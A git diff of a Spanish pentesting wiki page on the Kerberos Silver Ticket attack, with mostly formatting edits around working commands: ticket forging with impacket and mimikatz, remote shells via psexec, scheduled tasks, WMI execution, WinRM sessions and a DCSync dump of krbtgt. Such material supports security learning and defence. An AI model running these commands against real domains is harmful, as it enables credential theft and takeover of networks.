@@ -1,4 +1,4 @@
-# Ticket de Plata
+# Silver Ticket
 
 <details>
 
@@ -27,12 +27,15 @@ El ataque de **Ticket de Plata** implica la explotación de tickets de servicio 
 Para la creación de tickets, se emplean diferentes herramientas según el sistema operativo:
 
 ### En Linux
+
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
+
 ### En Windows
+
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -44,20 +47,21 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+
 El servicio CIFS se destaca como un objetivo común para acceder al sistema de archivos de la víctima, pero otros servicios como HOST y RPCSS también pueden ser explotados para tareas y consultas de WMI.
 
 ## Servicios Disponibles
 
-| Tipo de Servicio                           | Tickets Silver del Servicio                                               |
-| ------------------------------------------ | -------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Dependiendo del SO también:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>En algunas ocasiones también se puede solicitar: WINRM</p> |
-| Tareas Programadas                        | HOST                                                                       |
-| Compartir Archivos de Windows, también psexec | CIFS                                                                       |
-| Operaciones LDAP, incluido DCSync          | LDAP                                                                       |
-| Herramientas de Administración Remota del Servidor de Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Tickets Dorados                            | krbtgt                                                                     |
+| Tipo de Servicio                                              | Tickets Silver del Servicio                                                         |
+| ------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
+| WMI                                                           | <p>HOST</p><p>RPCSS</p>                                                             |
+| PowerShell Remoting                                           | <p>HOST</p><p>HTTP</p><p>Dependiendo del SO también:</p><p>WSMAN</p><p>RPCSS</p>    |
+| WinRM                                                         | <p>HOST</p><p>HTTP</p><p>En algunas ocasiones también se puede solicitar: WINRM</p> |
+| Tareas Programadas                                            | HOST                                                                                |
+| Compartir Archivos de Windows, también psexec                 | CIFS                                                                                |
+| Operaciones LDAP, incluido DCSync                             | LDAP                                                                                |
+| Herramientas de Administración Remota del Servidor de Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                                  |
+| Tickets Dorados                                               | krbtgt                                                                              |
 
 Usando **Rubeus** puedes **solicitar todos** estos tickets utilizando el parámetro:
 
@@ -76,20 +80,23 @@ En los siguientes ejemplos, imaginemos que el ticket se obtiene suplantando la c
 ### CIFS
 
 Con este ticket podrás acceder a las carpetas `C$` y `ADMIN$` a través de **SMB** (si están expuestas) y copiar archivos a una parte del sistema de archivos remoto simplemente haciendo algo como:
+
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
+
 También podrás obtener una shell dentro del host o ejecutar comandos arbitrarios usando **psexec**:
 
-{% content-ref url="../ntlm/psexec-and-winexec.md" %}
-[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
+{% content-ref url="../lateral-movement/psexec-and-winexec.md" %}
+[psexec-and-winexec.md](../lateral-movement/psexec-and-winexec.md)
 {% endcontent-ref %}
 
 ### HOST
 
 Con este permiso puedes generar tareas programadas en computadoras remotas y ejecutar comandos arbitrarios:
+
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -101,9 +108,11 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
+
 ### HOST + RPCSS
 
 Con estos tickets puedes **ejecutar WMI en el sistema de la víctima**:
+
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -113,24 +122,29 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
+
 Encuentra **más información sobre wmiexec** en la siguiente página:
 
-{% content-ref url="../ntlm/wmicexec.md" %}
-[wmicexec.md](../ntlm/wmicexec.md)
+{% content-ref url="../lateral-movement/wmicexec.md" %}
+[wmicexec.md](../lateral-movement/wmicexec.md)
 {% endcontent-ref %}
 
 ### HOST + WSMAN (WINRM)
 
 Con acceso winrm a una computadora, puedes **acceder** e incluso obtener un PowerShell:
+
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
+
 ### LDAP
 
 Con este privilegio, puedes volcar la base de datos del controlador de dominio utilizando **DCSync**:
+
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+
 **Aprende más sobre DCSync** en la siguiente página:
 
 ## Referencias
